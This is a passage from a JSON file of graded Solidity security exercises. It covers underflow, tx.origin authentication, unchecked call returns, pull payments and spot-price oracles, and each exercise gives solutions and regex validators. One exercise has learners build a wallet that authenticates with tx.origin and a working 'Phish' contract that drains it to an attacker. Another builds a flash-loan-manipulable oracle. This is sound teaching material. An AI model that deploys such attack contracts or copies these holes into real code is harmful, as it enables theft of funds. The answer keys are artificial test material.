class=\"io-row\"><span class=\"io-key\">transfer(to, 1) with balance 0</span><code class=\"io-val\">reverts (checked underflow)</code></div>\n  <div class=\"io-row\"><span class=\"io-key\">transfer(to, 10) with balance 100</span><code class=\"io-val\">sender 90, to +10</code></div>\n</div>",
    "hints": [
      "// SPDX-License-Identifier: MIT",
      "pragma solidity ^0.8.20;",
      "",
      "contract TokenLedger {",
      "    mapping(address => uint256) public balanceOf;",
      "",
      "    constructor() {",
      "        balanceOf[msg.sender] = 1000000;",
      "    }",
      "",
      "    function transfer(address to, uint256 amount) external {",
      "        require(balanceOf[msg.sender] >= amount, \"insufficient\");",
      "        balanceOf[msg.sender] -= amount;",
      "        balanceOf[to] += amount;",
      "    }",
      "}"
    ],
    "starterCode": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\n// Write TokenLedger.transfer with a require and a plain checked subtraction (no unchecked)\n",
    "solution": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\ncontract TokenLedger {\n    mapping(address => uint256) public balanceOf;\n\n    constructor() {\n        balanceOf[msg.sender] = 1000000;\n    }\n\n    function transfer(address to, uint256 amount) external {\n        require(balanceOf[msg.sender] >= amount, \"insufficient\");\n        balanceOf[msg.sender] -= amount;\n        balanceOf[to] += amount;\n    }\n}",
    "validation": {
      "checks": [
        {
          "type": "matchesRegex",
          "pattern": "contract\\s+TokenLedger\\s*\\{",
          "message": "Define contract TokenLedger."
        },
        {
          "type": "matchesRegex",
          "pattern": "mapping\\s*\\(\\s*address\\s*=>\\s*uint256\\s*\\)\\s*public\\s+balanceOf",
          "message": "Declare: mapping(address => uint256) public balanceOf;"
        },
        {
          "type": "matchesRegex",
          "pattern": "function\\s+transfer\\s*\\(\\s*address\\s+to\\s*,\\s*uint256\\s+amount\\s*\\)\\s+external",
          "message": "Add function transfer(address to, uint256 amount) external."
        },
        {
          "type": "matchesRegex",
          "pattern": "require\\(\\s*balanceOf\\[msg\\.sender\\]\\s*>=\\s*amount",
          "message": "Guard with require(balanceOf[msg.sender] >= amount ...)."
        },
        {
          "type": "matchesRegex",
          "pattern": "balanceOf\\[msg\\.sender\\]\\s*-=\\s*amount",
          "message": "Subtract with balanceOf[msg.sender] -= amount;"
        },
        {
          "type": "matchesRegex",
          "pattern": "balanceOf\\[to\\]\\s*\\+=\\s*amount",
          "message": "Credit with balanceOf[to] += amount;"
        },
        {
          "type": "matchesRegex",
          "pattern": "^(?![\\s\\S]*unchecked)[\\s\\S]*$",
          "message": "Do NOT wrap the subtraction in unchecked { }, the checked subtraction reverting on underflow is the fix."
        }
      ]
    },
    "explanation": "<p>Since 0.8 the language does the hard part for you, so the modern skill is spotting an <code>unchecked</code> that is not justified by a nearby proof that overflow is impossible. When you do need one for gas (incrementing a loop index, for instance) keep it tiny and put a comment right there stating why it is safe.</p>"
  },
  {
    "id": 374,
    "title": "Auth Anti-Pattern: tx.origin and the Phishing Contract",
    "difficulty": "medium",
    "topic": "Security: Auth Anti-Patterns",
    "level": 9,
    "xp": 15,
    "instructions": "<p>Every transaction has two \"who\" values. <code>msg.sender</code> is the immediate caller, whoever made <em>this</em> call, contract or human. <code>tx.origin</code> is the externally-owned account that signed and paid for the whole transaction, and it stays the same no matter how many contracts the call passes through. Level 5's signing challenge was about proving who authorised an action; <code>tx.origin</code> proves it too loosely.</p>\n<p>Authenticating with <code>require(tx.origin == owner)</code> looks equivalent to checking the sender, and it is, right up until the owner is tricked into calling a malicious contract. The attacker publishes something that looks harmless (\"claim your airdrop\") the owner calls it, and its code calls the vulnerable wallet. Inside that wallet <code>msg.sender</code> is the attacker's contract, but <code>tx.origin</code> is still the owner, so the check passes and the attacker's contract drains the wallet. This is a phishing attack, and it only works because of <code>tx.origin</code>.</p>\n<ul>\n  <li><strong>msg.sender:</strong> the address that made the current call, the previous contract in the chain, or the signer if there is no contract in between.</li>\n  <li><strong>tx.origin:</strong> the EOA that started the transaction. Unchanged through every nested call, which is exactly why it is unsafe for auth.</li>\n  <li><strong>phishing contract:</strong> a contract the victim is lured into calling; it re-enters a target that trusts <code>tx.origin</code>.</li>\n</ul>\n<p class=\"blueprint-line\"><code>require(tx.origin == owner);</code> &nbsp;&larr; passes even when msg.sender is an attacker contract</p>\n<div class=\"example-block\">\n  <span class=\"example-label\">Quick Example</span>\n  <pre><code>// VULNERABLE - tx.origin authentication\nfunction transferTo(address payable to, uint256 amount) external {\n    require(tx.origin == owner, \"not owner\");   // owner need only be the SIGNER, not the caller\n    (bool ok) = to.call{value: amount}(\"\");\n    require(ok, \"send failed\");\n}</code></pre>\n</div>\n<div class=\"note-block\">\n  <span class=\"note-label\">Note</span>\n  <span>The editor is not simulating any call chain, it just matches text. To run the real phishing flow, deploy <code>TxOriginWallet</code> and <code>Phish</code> in <code>remix.ethereum.org</code>, fund the wallet as the owner, then (as the owner) send a little ether to the <code>Phish</code> contract so its <code>receive()</code> fires and empties your wallet.</span>\n</div>\n<span class=\"task-label\">Your Task</span>\n<p class=\"task-line\">Write <code>contract TxOriginWallet</code> with <code>address public owner</code> set in the constructor, a <code>receive() external payable</code>, and an <code>external</code> function <code>transferTo(address payable to, uint256 amount)</code> that does <code>require(tx.origin == owner ...)</code> then <code>(bool ok) = to.call{value: amount}(\"\")</code> with <code>require(ok)</code>. Then write <code>contract Phish</code> that stores a <code>TxOriginWallet</code> and an attacker address from its constructor, and whose <code>receive() external payable</code> calls <code>victimWallet.transferTo</code> to move the wallet's balance to the attacker.</p>\n<div class=\"example-block\">\n  <span class=\"example-label\">Example</span>\n  <div class=\"io-row\"><span class=\"io-key\">owner calls Phish (which calls wallet)</span><code class=\"io-val\">msg.sender = Phish, tx.origin = owner &rarr; check passes</code></div>\n  <div class=\"io-row\"><span class=\"io-key\">result</span><code class=\"io-val\">wallet drained to attacker</code></div>\n</div>",
    "hints": [
      "// SPDX-License-Identifier: MIT",
      "pragma solidity ^0.8.20;",
      "",
      "contract TxOriginWallet {",
      "    address public owner;",
      "",
      "    constructor() {",
      "        owner = msg.sender;",
      "    }",
      "",
      "    function transferTo(address payable to, uint256 amount) external {",
      "        require(tx.origin == owner, \"not owner\");",
      "        (bool ok, ) = to.call{value: amount}(\"\");",
      "        require(ok, \"send failed\");",
      "    }",
      "",
      "    receive() external payable {}",
      "}",
      "",
      "contract Phish {",
      "    TxOriginWallet victimWallet;",
      "    address attacker;",
      "",
      "    constructor(TxOriginWallet _wallet) {",
      "        victimWallet = _wallet;",
      "        attacker = msg.sender;",
      "    }",
      "",
      "    receive() external payable {",
      "        victimWallet.transferTo(payable(attacker), address(victimWallet).balance);",
      "    }",
      "}"
    ],
    "starterCode": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\n// Write TxOriginWallet (auth via tx.origin) and Phish (victim is lured into calling it)\n",
    "solution": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\ncontract TxOriginWallet {\n    address public owner;\n\n    constructor() {\n        owner = msg.sender;\n    }\n\n    function transferTo(address payable to, uint256 amount) external {\n        require(tx.origin == owner, \"not owner\");\n        (bool ok, ) = to.call{value: amount}(\"\");\n        require(ok, \"send failed\");\n    }\n\n    receive() external payable {}\n}\n\ncontract Phish {\n    TxOriginWallet victimWallet;\n    address attacker;\n\n    constructor(TxOriginWallet _wallet) {\n        victimWallet = _wallet;\n        attacker = msg.sender;\n    }\n\n    receive() external payable {\n        victimWallet.transferTo(payable(attacker), address(victimWallet).balance);\n    }\n}",
    "validation": {
      "checks": [
        {
          "type": "matchesRegex",
          "pattern": "contract\\s+TxOriginWallet\\s*\\{",
          "message": "Define contract TxOriginWallet."
        },
        {
          "type": "matchesRegex",
          "pattern": "require\\(\\s*tx\\.origin\\s*==\\s*owner",
          "message": "transferTo must authenticate with require(tx.origin == owner ...)."
        },
        {
          "type": "matchesRegex",
          "pattern": "function\\s+transferTo\\s*\\(\\s*address\\s+payable\\s+to\\s*,\\s*uint256\\s+amount\\s*\\)\\s+external",
          "message": "Signature: function transferTo(address payable to, uint256 amount) external."
        },
        {
          "type": "matchesRegex",
          "pattern": "\\(\\s*bool\\s+ok\\s*,\\s*\\)\\s*=\\s*to\\.call\\{\\s*value\\s*:\\s*amount",
          "message": "Send with (bool ok) = to.call{value: amount}(\"\");"
        },
        {
          "type": "matchesRegex",
          "pattern": "contract\\s+Phish\\s*\\{",
          "message": "Define contract Phish."
        },
        {
          "type": "matchesRegex",
          "pattern": "victimWallet\\.transferTo\\(",
          "message": "Phish.receive() must call victimWallet.transferTo(...)."
        },
        {
          "type": "matchesRegex",
          "pattern": "receive\\s*\\(\\s*\\)\\s+external\\s+payable",
          "message": "Phish needs a receive() external payable that runs the attack."
        }
      ]
    },
    "explanation": "<p>The one-line takeaway: <code>tx.origin</code> tells you who signed, never who called, so it cannot distinguish the owner acting directly from the owner being puppeted through a hostile contract. The next challenge is the fix, and it is almost too short to be a challenge, swap in <code>msg.sender</code>.</p>"
  },
  {
    "id": 375,
    "title": "Auth Anti-Pattern: Fix It with msg.sender",
    "difficulty": "medium",
    "topic": "Security: Auth Anti-Patterns",
    "level": 9,
    "xp": 15,
    "instructions": "<p>The phishing attack in the previous challenge worked because <code>tx.origin</code> stays fixed to the signer through every nested call, so a hostile middle contract inherits the owner's authority. Checking <code>msg.sender</code> instead asks a stricter question: is the <em>immediate</em> caller the owner? A phishing contract calling on the victim's behalf is <code>msg.sender</code>, and it is not the owner, so the call reverts. That is the entire fix.</p>\n<p>There is almost no legitimate reason to authenticate with <code>tx.origin</code>. The one occasionally-cited use, \"reject all calls that come from any contract\" via <code>require(msg.sender == tx.origin)</code>, is fragile (it breaks account abstraction and multisigs) and is about call shape, not identity. For \"is this the owner?\", it is always <code>msg.sender</code>.</p>\n<ul>\n  <li><strong>onlyOwner:</strong> the standard guard modifier, <code>require(msg.sender == owner)</code> then <code>_;</code>.</li>\n  <li><strong>msg.sender check:</strong> authenticates the caller one hop away, so an interposed contract cannot borrow the signer's rights.</li>\n</ul>\n<p class=\"blueprint-line\"><code>modifier onlyOwner() { require(msg.sender == owner, \"not owner\"); _; }</code></p>\n<div class=\"example-block\">\n  <span class=\"example-label\">Quick Example</span>\n  <pre><code>function transferTo(address payable to, uint256 amount) external onlyOwner {\n    (bool ok) = to.call{value: amount}(\"\");   // reachable only if msg.sender == owner\n    require(ok, \"send failed\");\n}</code></pre>\n</div>\n<div class=\"note-block\">\n  <span class=\"note-label\">Note</span>\n  <span>This grader only inspects the characters you type. Confirm the fix in <code>remix.ethereum.org</code>: redeploy the <code>Phish</code> contract against this <code>SafeWallet</code>, run the same lure, and watch <code>transferTo</code> revert with \"not owner\" instead of draining anything.</span>\n</div>\n<span class=\"task-label\">Your Task</span>\n<p class=\"task-line\">Write <code>contract SafeWallet</code> with <code>address public owner</code> set to <code>msg.sender</code> in the constructor and a <code>receive() external payable</code>. Add <code>modifier onlyOwner()</code> that does <code>require(msg.sender == owner ...)</code> then <code>_;</code>. Add <code>function transferTo(address payable to, uint256 amount) external onlyOwner</code> that does <code>(bool ok) = to.call{value: amount}(\"\")</code> and <code>require(ok)</code>. Do not use <code>tx.origin</code> anywhere.</p>\n<div class=\"example-block\">\n  <span class=\"example-label\">Example</span>\n  <div class=\"io-row\"><span class=\"io-key\">owner calls transferTo directly</span><code class=\"io-val\">succeeds</code></div>\n  <div class=\"io-row\"><span class=\"io-key\">Phish calls transferTo for the owner</span><code class=\"io-val\">reverts: msg.sender != owner</code></div>\n</div>",
    "hints": [
      "// SPDX-License-Identifier: MIT",
      "pragma solidity ^0.8.20;",
      "",
      "contract SafeWallet {",
      "    address public owner;",
      "",
      "    constructor() {",
      "        owner = msg.sender;",
      "    }",
      "",
      "    modifier onlyOwner() {",
      "        require(msg.sender == owner, \"not owner\");",
      "        _;",
      "    }",
      "",
      "    function transferTo(address payable to, uint256 amount) external onlyOwner {",
      "        (bool ok, ) = to.call{value: amount}(\"\");",
      "        require(ok, \"send failed\");",
      "    }",
      "",
      "    receive() external payable {}",
      "}"
    ],
    "starterCode": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\n// Rewrite the wallet: authenticate transferTo with msg.sender, never tx.origin\n",
    "solution": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\ncontract SafeWallet {\n    address public owner;\n\n    constructor() {\n        owner = msg.sender;\n    }\n\n    modifier onlyOwner() {\n        require(msg.sender == owner, \"not owner\");\n        _;\n    }\n\n    function transferTo(address payable to, uint256 amount) external onlyOwner {\n        (bool ok, ) = to.call{value: amount}(\"\");\n        require(ok, \"send failed\");\n    }\n\n    receive() external payable {}\n}",
    "validation": {
      "checks": [
        {
          "type": "matchesRegex",
          "pattern": "contract\\s+SafeWallet\\s*\\{",
          "message": "Define contract SafeWallet."
        },
        {
          "type": "matchesRegex",
          "pattern": "modifier\\s+onlyOwner\\s*\\(\\s*\\)",
          "message": "Define modifier onlyOwner()."
        },
        {
          "type": "matchesRegex",
          "pattern": "require\\(\\s*msg\\.sender\\s*==\\s*owner",
          "message": "onlyOwner must be require(msg.sender == owner ...)."
        },
        {
          "type": "matchesRegex",
          "pattern": "function\\s+transferTo\\s*\\(\\s*address\\s+payable\\s+to\\s*,\\s*uint256\\s+amount\\s*\\)\\s+external\\s+onlyOwner",
          "message": "transferTo must be external onlyOwner."
        },
        {
          "type": "matchesRegex",
          "pattern": "\\(\\s*bool\\s+ok\\s*,\\s*\\)\\s*=\\s*to\\.call\\{\\s*value\\s*:\\s*amount",
          "message": "Send with (bool ok) = to.call{value: amount}(\"\");"
        },
        {
          "type": "matchesRegex",
          "pattern": "require\\(\\s*ok",
          "message": "Check the send with require(ok ...)."
        },
        {
          "type": "matchesRegex",
          "pattern": "^(?![\\s\\S]*tx\\.origin)[\\s\\S]*$",
          "message": "Remove every tx.origin, authenticate with msg.sender only."
        }
      ]
    },
    "explanation": "<p>Linters and static analysers (Slither, the Solidity compiler's own warnings) flag <code>tx.origin</code> used in a comparison for this reason, and OpenZeppelin's <code>Ownable</code> checks <code>msg.sender</code>. Treat any <code>tx.origin ==</code> in a codebase as a finding until proven otherwise.</p>"
  },
  {
    "id": 376,
    "title": "External Calls: The Ignored Return Value",
    "difficulty": "medium",
    "topic": "Security: External Calls",
    "level": 9,
    "xp": 15,
    "instructions": "<p>A low-level <code>addr.call{value: n}(\"\")</code> does not revert when the transfer fails. It returns <code>(bool success, bytes memory data)</code>, and if the recipient rejects the ether or runs out of gas, <code>success</code> comes back <code>false</code> while your function keeps going as if nothing happened. Level 6's node challenges made the point that a remote party can fail or stall; here the failure is silent unless you look for it.</p>\n<p>Ignore that boolean in a payout function and you get a contract that marks a debt as settled, emits a \"paid\" event, and never actually moved the money. The fix is one line: capture <code>ok</code> and <code>require</code> it.</p>\n<ul>\n  <li><strong>low-level call:</strong> <code>call</code> returns a success flag instead of reverting; the caller is responsible for checking it.</li>\n  <li><strong>silent failure:</strong> execution continues past a failed transfer, so later state changes (marking something paid, emitting an event) run on a false premise.</li>\n  <li><strong>require(ok):</strong> turns the ignored flag into a revert, rolling back the whole call if the transfer did not go through.</li>\n</ul>\n<p class=\"blueprint-line\"><code>(bool ok) = to.call{value: amount}(\"\");</code><br><code>require(ok, \"transfer failed\");</code></p>\n<div class=\"example-block\">\n  <span class=\"example-label\">Quick Example</span>\n  <pre><code>// VULNERABLE - return value dropped\nfunction pay(address to, uint256 amount) external {\n    to.call{value: amount}(\"\");   // if this returns false, we never know\n    paid[to] = true;             // marked settled anyway\n}</code></pre>\n</div>\n<div class=\"note-block\">\n  <span class=\"note-label\">Note</span>\n  <span>The editor checks text only and will happily accept a broken payout. In <code>remix.ethereum.org</code>, deploy a recipient contract with no <code>receive()</code> (so it rejects ether), call the unchecked <code>pay</code> against it, and note the transaction still succeeds; add <code>require(ok)</code> and watch the same call revert.</span>\n</div>\n<span class=\"task-label\">Your Task</span>\n<p class=\"task-line\">Write <code>contract Payouts</code> with a <code>receive() external payable</code> and an <code>external</code> function <code>pay(address to, uint256 amount)</code> that does <code>(bool ok) = to.call{value: amount}(\"\")</code> and then <code>require(ok ...)</code>. The <code>require(ok)</code> must come <em>after</em> the <code>call</code>.</p>\n<div class=\"example-block\">\n  <span class=\"example-label\">Example</span>\n  <div class=\"io-row\"><span class=\"io-key\">pay(rejectingContract, 1)</span><code class=\"io-val\">reverts on require(ok)</code></div>\n  <div class=\"io-row\"><span class=\"io-key\">pay(normalWallet, 1)</span><code class=\"io-val\">succeeds</code></div>\n</div>",
    "hints": [
      "// SPDX-License-Identifier: MIT",
      "pragma solidity ^0.8.20;",
      "",
      "contract Payouts {",
      "    function pay(address to, uint256 amount) external {",
      "        (bool ok, ) = to.call{value: amount}(\"\");",
      "        require(ok, \"transfer failed\");",
      "    }",
      "",
      "    receive() external payable {}",
      "}"
    ],
    "starterCode": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\n// Write Payouts.pay so a failed transfer reverts instead of passing silently\n",
    "solution": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\ncontract Payouts {\n    function pay(address to, uint256 amount) external {\n        (bool ok, ) = to.call{value: amount}(\"\");\n        require(ok, \"transfer failed\");\n    }\n\n    receive() external payable {}\n}",
    "validation": {
      "checks": [
        {
          "type": "codeContains",
          "value": "pragma solidity",
          "message": "Start with a pragma solidity line."
        },
        {
          "type": "matchesRegex",
          "pattern": "contract\\s+Payouts\\s*\\{",
          "message": "Define contract Payouts."
        },
        {
          "type": "matchesRegex",
          "pattern": "function\\s+pay\\s*\\(\\s*address\\s+\\w+\\s*,\\s*uint256\\s+\\w+\\s*\\)\\s+external",
          "message": "Add function pay(address to, uint256 amount) external."
        },
        {
          "type": "matchesRegex",
          "pattern": "\\(\\s*bool\\s+ok\\s*,\\s*\\)\\s*=\\s*\\w+\\.call\\{\\s*value\\s*:\\s*\\w+\\s*\\}\\(\\s*\"\"\\s*\\)",
          "message": "Capture the flag: (bool ok) = to.call{value: amount}(\"\");"
        },
        {
          "type": "matchesRegex",
          "pattern": "\\.call\\{\\s*value[\\s\\S]*require\\(\\s*ok",
          "message": "require(ok ...) must come AFTER the call."
        },
        {
          "type": "matchesRegex",
          "pattern": "receive\\s*\\(\\s*\\)\\s+external\\s+payable",
          "message": "Add receive() external payable so the contract can hold ether."
        }
      ]
    },
    "explanation": "<p>The same rule applies to any low-level <code>call</code>, <code>delegatecall</code>, or <code>staticcall</code>, and to <code>send</code>: they report failure through a return value, not a revert. When you call a typed external contract method directly (<code>token.transfer(...)</code>) the revert does propagate, but ERC-20 tokens that return <code>false</code> instead of reverting are why <code>SafeERC20</code> exists.</p>"
  },
  {
    "id": 377,
    "title": "External Calls: Push-Payment Griefing to Pull Payments",
    "difficulty": "hard",
    "topic": "Security: External Calls",
    "level": 9,
    "xp": 25,
    "instructions": "<p>A contract that pays a list of recipients by looping over an array and sending to each one has handed a veto to every address on that list. If a single recipient is a contract that reverts on receipt, deliberately, or just because it has no <code>receive()</code>, the send fails, the loop reverts, and <em>nobody</em> gets paid. The attacker spends nothing; they just refuse delivery. This is <strong>griefing</strong>: no direct profit, but the payout function is bricked for everyone.</p>\n<p>The cure is to stop pushing. Instead of sending inside the loop, record what each address is owed in a mapping, and let each recipient <em>pull</em> their own funds with a separate <code>claim()</code>. Now one bad recipient can only block their own claim. This \"pull over push\" pattern is one of the most reliable habits in contract design, and it composes cleanly with the checks-effects-interactions ordering from the reentrancy challenges, zero the balance before you send.</p>\n<ul>\n  <li><strong>push payment:</strong> the contract sends funds to recipients itself, usually in a loop. One failing send can revert the batch.</li>\n  <li><strong>griefing:</strong> an attack whose goal is to break a function for others rather than to steal; the attacker often profits nothing.</li>\n  <li><strong>pull payment:</strong> the contract credits an internal balance; each recipient withdraws their own share in a separate transaction, isolating failures.</li>\n</ul>\n<p class=\"blueprint-line\"><code>withdrawableBalance[recipient] += amount;</code> &nbsp;(allocate)<br><code>uint256 amount = withdrawableBalance[msg.sender]; withdrawableBalance[msg.sender] = 0;</code> &nbsp;(claim)<br><code>(bool ok) = msg.sender.call{value: amount}(\"\");</code></p>\n<div class=\"example-block\">\n  <span class=\"example-label\">Quick Example</span>\n  <pre><code>// VULNERABLE - one reverting recipient blocks the whole batch\nfunction payAll(address[] calldata who, uint256 amt) external {\n    for (uint256 i = 0; i < who.length; i++) {\n        (bool ok) = who[i].call{value: amt}(\"\");   // recipient 3 reverts -> 0, 1, 2 also lose out\n        require(ok, \"send failed\");\n    }\n}</code></pre>\n</div>\n<div class=\"note-block\">\n  <span class=\"note-label\">Note</span>\n  <span>The editor grades text, not execution, it will not show you a stuck batch. In <code>remix.ethereum.org</code>, build the push version, include one recipient contract that reverts in its <code>receive()</code>, and watch <code>payAll</code> fail entirely; then switch to the pull version and confirm the good recipients can still <code>claim()</code>.</span>\n</div>\n<span class=\"task-label\">Your Task</span>\n<p class=\"task-line\">Write <code>contract Rewards</code> with <code>mapping(address =&gt; uint256) public withdrawableBalance</code> and a <code>receive() external payable</code>. Add <code>function allocate(address[] calldata recipients, uint256 amountEach) external</code> that loops <code>for (uint256 i = 0; i &lt; recipients.length; i++)</code> and does <code>withdrawableBalance[recipients[i]] += amountEach;</code>. Add <code>function claim() external</code> that reads <code>uint256 amount = withdrawableBalance[msg.sender];</code>, <code>require</code>s <code>amount &gt; 0</code>, sets <code>withdrawableBalance[msg.sender] = 0;</code> <em>before</em> doing <code>(bool ok) = msg.sender.call{value: amount}(\"\")</code> and <code>require(ok)</code>.</p>\n<div class=\"example-block\">\n  <span class=\"example-label\">Example</span>\n  <div class=\"io-row\"><span class=\"io-key\">allocate([a, b, c], 5)</span><code class=\"io-val\">withdrawableBalance for a, b, c each +5</code></div>\n  <div class=\"io-row\"><span class=\"io-key\">c reverts on claim()</span><code class=\"io-val\">a and b still claim fine</code></div>\n</div>",
    "hints": [
      "// SPDX-License-Identifier: MIT",
      "pragma solidity ^0.8.20;",
      "",
      "contract Rewards {",
      "    mapping(address => uint256) public withdrawableBalance;",
      "",
      "    function allocate(address[] calldata recipients, uint256 amountEach) external {",
      "        for (uint256 i = 0; i < recipients.length; i++) {",
      "            withdrawableBalance[recipients[i]] += amountEach;",
      "        }",
      "    }",
      "",
      "    function claim() external {",
      "        uint256 amount = withdrawableBalance[msg.sender];",
      "        require(amount > 0, \"nothing to claim\");",
      "        withdrawableBalance[msg.sender] = 0;",
      "        (bool ok, ) = msg.sender.call{value: amount}(\"\");",
      "        require(ok, \"send failed\");",
      "    }",
      "",
      "    receive() external payable {}",
      "}"
    ],
    "starterCode": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\n// Refactor push payments to pull: allocate() credits a mapping, claim() withdraws\n",
    "solution": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\ncontract Rewards {\n    mapping(address => uint256) public withdrawableBalance;\n\n    function allocate(address[] calldata recipients, uint256 amountEach) external {\n        for (uint256 i = 0; i < recipients.length; i++) {\n            withdrawableBalance[recipients[i]] += amountEach;\n        }\n    }\n\n    function claim() external {\n        uint256 amount = withdrawableBalance[msg.sender];\n        require(amount > 0, \"nothing to claim\");\n        withdrawableBalance[msg.sender] = 0;\n        (bool ok, ) = msg.sender.call{value: amount}(\"\");\n        require(ok, \"send failed\");\n    }\n\n    receive() external payable {}\n}",
    "validation": {
      "checks": [
        {
          "type": "matchesRegex",
          "pattern": "mapping\\s*\\(\\s*address\\s*=>\\s*uint256\\s*\\)\\s*public\\s+withdrawableBalance",
          "message": "Declare: mapping(address => uint256) public withdrawableBalance;"
        },
        {
          "type": "matchesRegex",
          "pattern": "function\\s+allocate\\s*\\(\\s*address\\[\\]\\s+calldata\\s+\\w+\\s*,\\s*uint256\\s+\\w+\\s*\\)\\s+external",
          "message": "Signature: function allocate(address[] calldata recipients, uint256 amountEach) external."
        },
        {
          "type": "matchesRegex",
          "pattern": "for\\s*\\(\\s*uint256\\s+\\w+\\s*=\\s*0\\s*;",
          "message": "Loop the recipients with for (uint256 i = 0; i < recipients.length; i++)."
        },
        {
          "type": "matchesRegex",
          "pattern": "withdrawableBalance\\[\\s*\\w+\\[\\s*\\w+\\s*\\]\\s*\\]\\s*\\+=",
          "message": "Credit each: withdrawableBalance[recipients[i]] += amountEach;"
        },
        {
          "type": "matchesRegex",
          "pattern": "function\\s+claim\\s*\\(\\s*\\)\\s+external",
          "message": "Add function claim() external."
        },
        {
          "type": "matchesRegex",
          "pattern": "require\\(\\s*amount\\s*>\\s*0",
          "message": "claim() must require(amount > 0 ...)."
        },
        {
          "type": "matchesRegex",
          "pattern": "withdrawableBalance\\[msg\\.sender\\]\\s*=\\s*0",
          "message": "Zero the caller's balance in claim()."
        },
        {
          "type": "matchesRegex",
          "pattern": "withdrawableBalance\\[msg\\.sender\\]\\s*=\\s*0[\\s\\S]*msg\\.sender\\.call\\{\\s*value\\s*:\\s*amount",
          "message": "Zero the balance BEFORE the external call (checks-effects-interactions)."
        },
        {
          "type": "matchesRegex",
          "pattern": "require\\(\\s*ok",
          "message": "Check the send with require(ok ...)."
        }
      ]
    },
    "explanation": "<p>Pull payments turn \"the system is down for everyone\" into \"one address cannot collect\", which is almost always the trade you want. OpenZeppelin's <code>PullPayment</code> and its <code>Escrow</code> helper package this exact pattern; the same idea underlies how staking and airdrop contracts let millions of addresses claim without the deployer ever looping over them.</p>"
  },
  {
    "id": 378,
    "title": "Oracle Manipulation: The Naive Spot Price",
    "difficulty": "hard",
    "topic": "Security: Oracle Manipulation",
    "level": 9,
    "xp": 25,
    "instructions": "<p>A contract that needs to know \"what is token B worth in token A?\" often reads it straight from an on-chain automated market maker (AMM) pair: take the two reserve balances and divide. <code>price = reserveB * 1e18 / reserveA</code>. It is one call, it is always fresh, and it is trivially manipulable, because those reserves are just balances that any trade moves.</p>\n<p>The attack is a single transaction. Take a <strong>flash loan</strong> (borrow a huge amount with no collateral on the condition you repay before the transaction ends) dump it into the pair to skew the reserves, call the victim contract while its <code>getPrice</code> reports the distorted number, then trade back and repay. The victim saw a price that existed for exactly one transaction and never at any real market. Level 6's work on trusting data from outside a single source applies directly: one AMM pair is one source, and it is one you do not control. Here you write the naive <code>getPrice</code> so its shape is unmistakable.</p>\n<ul>\n  <li><strong>AMM / pair:</strong> a contract holding reserves of two tokens; its price is defined by the ratio of those reserves and changes with every swap.</li>\n  <li><strong>spot price:</strong> the instantaneous ratio right now. Cheap to read, cheap to move.</li>\n  <li><strong>flash loan:</strong> an uncollateralised loan that must be borrowed and repaid within one transaction; it lets an attacker wield enormous capital for a few thousand gas.</li>\n</ul>\n<p class=\"blueprint-line\"><code>(uint112 reserveA, uint112 reserveB) = pair.getReserves();</code><br><code>return uint256(reserveB) * 1e18 / uint256(reserveA);</code> &nbsp;&larr; one pair, one block, manipulable</p>\n<div class=\"example-block\">\n  <span class=\"example-label\">Quick Example</span>\n  <pre><code>// VULNERABLE - spot price from a single pair\nfunction getPrice() external view returns (uint256) {\n    (uint112 rA, uint112 rB) = pair.getReserves();\n    return uint256(rB) * 1e18 / uint256(rA);   // flash-loan a swap and this moves however you want\n}</code></pre>\n</div>\n<div class=\"note-block\">\n  <span class=\"note-label\">Note</span>\n  <span>Nothing runs in this editor, so you will not see a price move. To make it concrete, in <code>remix.ethereum.org</code> deploy a mock pair with settable reserves, read <code>getPrice</code>, then change the reserves to simulate a large swap and read it again, the number you would lend or liquidate against just jumped.</span>\n</div>\n<span class=\"task-label\">Your Task</span>\n<p class=\"task-line\">Write <code>interface IPair</code> with <code>function getReserves() external view returns (uint112 reserveA, uint112 reserveB);</code>. Write <code>contract NaiveOracle</code> that stores an <code>IPair public pair</code> from its constructor and has <code>function getPrice() external view returns (uint256)</code> which calls <code>pair.getReserves()</code> and returns <code>uint256(reserveB) * 1e18 / uint256(reserveA)</code>.</p>\n<div class=\"example-block\">\n  <span class=\"example-label\">Example</span>\n  <div class=\"io-row\"><span class=\"io-key\">reserves 1000 A / 2000 B</span><code class=\"io-val\">getPrice() = 2e18</code></div>\n  <div class=\"io-row\"><span class=\"io-key\">after a flash-loan swap</span><code class=\"io-val\">getPrice() reads whatever the attacker set</code></div>\n</div>",
    "hints": [
      "// SPDX-License-Identifier: MIT",
      "pragma solidity ^0.8.20;",
      "",
      "interface IPair {",
      "    function getReserves() external view returns (uint112 reserveA, uint112 reserveB);",
      "}",
      "",
      "contract NaiveOracle {",
      "    IPair public pair;",
      "",
      "    constructor(IPair _pair) {",
      "        pair = _pair;",
      "    }",
      "",
      "    function getPrice() external view returns (uint256) {",
      "        (uint112 reserveA, uint112 reserveB) = pair.getReserves();",
      "        return uint256(reserveB) * 1e18 / uint256(reserveA);",
      "    }",
      "}"
    ],
    "starterCode": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\n// Write IPair and NaiveOracle.getPrice reading spot price from a single pair\n",
    "solution": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\ninterface IPair {\n    function getReserves() external view returns (uint112 reserveA, uint112 reserveB);\n}\n\ncontract NaiveOracle {\n    IPair public pair;\n\n    constructor(IPair _pair) {\n        pair = _pair;\n    }\n\n    function getPrice() external view returns (uint256) {\n        (uint112 reserveA, uint112 reserveB) = pair.getReserves();\n        return uint256(reserveB) * 1e18 / uint256(reserveA);\n    }\n}",
    "validation": {
      "checks": [
        {
          "type": "matchesRegex",
          "pattern": "interface\\s+IPair\\s*\\{",
          "message": "Declare interface IPair."
        },
        {
          "type": "matchesRegex",
          "pattern": "function\\s+getReserves\\s*\\(\\s*\\)\\s+external\\s+view\\s+returns",
          "message": "IPair needs getReserves() external view returns (uint112, uint112)."
        },
        {
          "type": "matchesRegex",
          "pattern": "contract\\s+NaiveOracle\\s*\\{",
